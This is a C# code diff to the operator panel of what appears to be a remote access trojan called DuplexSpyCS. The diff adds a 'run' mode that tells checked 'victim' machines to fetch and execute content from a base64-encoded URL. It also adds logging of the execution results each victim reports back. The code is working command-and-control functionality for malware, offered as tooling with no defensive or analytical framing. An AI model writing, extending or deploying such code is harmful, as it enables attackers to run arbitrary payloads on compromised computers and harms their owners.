@@ -27,6 +27,9 @@ namespace DuplexSpyCS
 
         void fnRecv(clsListener listener, clsVictim v, List<string> cmd)
         {
+            if (!m_lsVictim.Contains(v))
+                return;
+
             if (cmd[0] == "exec")
             {
                 if (cmd[1] == "url")
@@ -51,8 +54,25 @@ namespace DuplexSpyCS
                             }
                         }));
                     }
+                    else if (cmd[2] == "run")
+                    {
+                        string szURL = clsCrypto.b64D2Str(cmd[3]);
+                        int nCode = int.Parse(cmd[4]);
+                        string szMsg = nCode == 0 ? clsCrypto.b64D2Str(cmd[5]) : "Executed, please checked";
+
+                        fnLogs(v, szMsg);
+                    }
                 }
             }
+        }
+
+        void fnLogs(clsVictim victim, string szMsg)
+        {
+            Invoke(new Action(() =>
+            {
+                richTextBox1.AppendText($"[{victim.ID}]: {szMsg}");
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
         void setup()
@@ -77,19 +97,23 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
-            nCnt = 0;
-
-            int nThd = (int)numericUpDown1.Value;
             string szURL = textBox1.Text;
+            bool bExec = checkBox1.Checked;
 
-            foreach (ListViewItem item in listView1.CheckedItems)
+            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            if (lsVictim.Count == 0)
             {
-                clsVictim v = (clsVictim)item.Tag;
+                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            foreach (var v in lsVictim)
+            {
                 v.fnSendCommand(new string[]
                 {
                     "exec",
                     "url",
-                    "open",
+                    bExec ? "run" : "open",
                     clsCrypto.b64E2Str(szURL),
                 });
             }
@@ -112,6 +136,11 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.Items)
                 item.Checked = false;
+        }
+
+        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\MultiURL").Show();
         }
     }
 }
